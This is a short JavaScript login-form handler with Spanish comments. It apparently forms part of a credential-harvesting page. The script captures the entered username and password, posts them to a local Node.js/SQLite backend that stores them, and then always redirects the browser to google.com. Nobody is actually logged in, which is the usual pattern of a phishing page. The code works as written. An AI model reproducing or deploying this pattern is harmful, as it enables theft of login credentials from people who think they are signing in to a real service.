document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault(); // Evita que la página se recargue de forma predeterminada

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    try {
        // Enviar los datos al servidor backend (Node.js/SQLite)
        const response = await fetch('http://localhost:3000/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });

        if (response.ok) {
            console.log('Datos guardados correctamente en la base de datos.');
        } else {
            console.error('Error al guardar los datos.');
        }
    } catch (error) {
        console.error('Error de conexión con el servidor:', error);
    } finally {
        // Redirigir a la página de Google sin importar si la petición falló o tuvo éxito
        window.location.href = 'https://www.google.com';
    }
});